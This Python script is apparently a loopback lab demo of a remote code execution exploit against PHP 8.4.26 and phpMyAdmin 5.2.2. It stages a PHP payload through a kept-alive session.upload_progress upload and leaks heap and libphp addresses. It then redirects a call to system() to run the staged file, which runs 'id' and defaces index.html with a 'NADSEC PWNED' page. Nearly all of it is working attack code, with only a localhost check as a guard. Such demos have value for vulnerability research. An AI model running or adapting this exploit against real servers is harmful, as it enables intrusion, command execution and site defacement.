#!/usr/bin/env python3
"""Real loopback demo: PHP 8.4.26 RCE visibly replaces phpMyAdmin's home page.

The long PHP payload is delivered only through session.upload_progress.  The
calibrated short command is ``php /tmp/s*``; it executes that staged session
file and writes ``index.html``.  Nothing is copied into the target container by
Docker or the host during the attack.
"""
from __future__ import annotations

import argparse
import base64
import json
import socket
import threading
import time
import urllib.parse

import stock_phpmyadmin_gate as gate


DEFAULT_HTML = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>NADSEC PWNED</title>
<style>
html,body{height:100%;margin:0;background:#050608;color:#eee;font-family:Consolas,monospace}
body{display:grid;place-items:center;background:radial-gradient(circle at center,#171b22 0,#050608 68%)}
main{text-align:center;border:1px solid #ff1744;padding:4rem 5rem;box-shadow:0 0 50px #ff174466}
h1{margin:0;color:#ff1744;font-size:clamp(3rem,10vw,8rem);letter-spacing:.08em;text-shadow:0 0 22px #ff1744}
p{color:#7df9ff;font-size:1.25rem;letter-spacing:.12em}
pre{display:inline-block;text-align:left;color:#9cff57;background:#000;padding:1rem 1.5rem;border-left:4px solid #9cff57}
</style>
</head>
<body><main><h1>NADSEC PWNED</h1><p>PHP 8.4.26 / phpMyAdmin 5.2.2</p><pre>__ID__</pre></main></body>
</html>
"""


def php_payload(html: str) -> str:
    encoded = base64.b64encode(html.encode()).decode()
    return (
        "<?php $h=base64_decode('" + encoded + "');"
        "file_put_contents('/var/www/html/index.html',"
        "str_replace('__ID__',htmlspecialchars(shell_exec('id')),$h));?>"
    )


class StagedSession:
    """Keep a PHP-bearing upload-progress session file alive over HTTP."""

    def __init__(self, host: str, port: int, host_header: str, payload: str) -> None:
        self.host = host
        self.port = port
        self.host_header = host_header
        self.payload = payload
        self.stop = threading.Event()
        self.sock: socket.socket | None = None
        self.thread: threading.Thread | None = None

    def start(self) -> None:
        boundary = "PLANT"
        prefix = (
            f'--{boundary}\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\n0\r\n'
            f'--{boundary}\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
            f'--{boundary}\r\nContent-Disposition: form-data; name="f"; filename="{self.payload}"\r\n\r\n'
        ).encode()
        first = prefix + b"Z" * 6000
        content_length = len(first) + 500_000
        request = (
            f"POST / HTTP/1.1\r\nHost: {self.host_header}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {content_length}\r\n"
            "Cookie: PHPSESSID=0\r\nConnection: close\r\n\r\n"
        ).encode() + first

        self.sock = socket.create_connection((self.host, self.port), 30)
        self.sock.settimeout(10)
        self.sock.sendall(request)

        def trickle() -> None:
            assert self.sock is not None
            while not self.stop.wait(1.0):
                try:
                    self.sock.sendall(b"Z")
                except OSError:
                    return

        self.thread = threading.Thread(target=trickle, daemon=True)
        self.thread.start()

    def close(self) -> None:
        self.stop.set()
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
        if self.thread is not None:
            self.thread.join(timeout=2.0)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--host-header", default="x")
    parser.add_argument("--blockers", type=int, default=148)
    parser.add_argument("--settle", type=float, default=10.0)
    parser.add_argument("--leak-tries", type=int, default=3)
    parser.add_argument("--fire-tries", type=int, default=6)
    parser.add_argument("--table-off", type=lambda value: int(value, 0), default=0x690D8)
    parser.add_argument("--timeout", type=float, default=180.0)
    parser.add_argument("--ack-exact-profile", action="store_true")
    args = parser.parse_args()

    parsed = urllib.parse.urlsplit(args.url)
    if parsed.scheme != "http" or parsed.hostname != "127.0.0.1" or parsed.port is None:
        raise ValueError("this demo requires an explicit http://127.0.0.1:<port> URL")
    if not args.ack_exact_profile:
        raise ValueError("refusing hard-coded offsets without --ack-exact-profile")
    if not args.host_header:
        raise ValueError("--host-header must not be empty")

    endpoint = gate.stock.Endpoint(args.url, args.timeout)
    endpoint.host_override = args.host_header
    endpoint.host_header = args.host_header
    marker = b"NADSEC PWNED"
    if gate.stock.proof(endpoint, "/", marker):
        raise RuntimeError("target is already defaced; reset the lab before recording")

    blockers = gate.BlockerPool(parsed.hostname, parsed.port, args.blockers)
    staged = StagedSession(parsed.hostname, parsed.port, args.host_header, php_payload(DEFAULT_HTML))
    result: dict[str, object] = {
        "target": args.url,
        "requested_blockers": args.blockers,
        "staged_command": "php /tmp/s*",
        "marker": marker.decode(),
    }

    try:
        connected = blockers.start()
        result["connected_blockers"] = connected
        if connected != args.blockers:
            result["status"] = "blocker_setup_failed"
            print(json.dumps(result, indent=2))
            return 1
        time.sleep(args.settle)
        result["blockers_alive_after_settle"] = blockers.connected
        print(f"[*] blockers alive {blockers.connected}/{args.blockers}", flush=True)

        staged.start()
        time.sleep(2.0)
        print("[*] staged PHP payload in live upload-progress session", flush=True)

        heap, module = gate.stock.Leak(endpoint, gate.ZVAL_PTR_DTOR, True).run(args.leak_tries)
        result["heap"] = hex(heap)
        result["libphp"] = hex(module)
        if not heap or not module:
            result["status"] = "leak_failed"
            print(json.dumps(result, indent=2))
            return 1

        fire = gate.stock.Fire(endpoint, gate.ZIF_SYSTEM, gate.ZVAL_PTR_DTOR, True)
        for attempt in range(1, args.fire_tries + 1):
            fire.rotate()
            fire.run(
                heap,
                module,
                b"php /tmp/s*",
                table_offset=args.table_off,
                cookie="a" * 32,
                spray=15,
                live_n=0,
                live_len=31,
                fill_n=0,
                carrier_mode="adopted",
                progress_late=False,
                pads=gate.stock.parse_pads(""),
                decoy_n=2,
            )
            time.sleep(1.0)
            if gate.stock.proof(endpoint, "/", marker):
                result["status"] = "deface_proved"
                result["fire_attempt"] = attempt
                result["blockers_alive_at_proof"] = blockers.connected
                print(json.dumps(result, indent=2))
                return 0
            print(f"[*] fire {attempt}/{args.fire_tries}: marker absent", flush=True)

        result["status"] = "fire_failed"
        print(json.dumps(result, indent=2))
        return 1
    finally:
        staged.close()
        blockers.close()


if __name__ == "__main__":
    raise SystemExit(main())
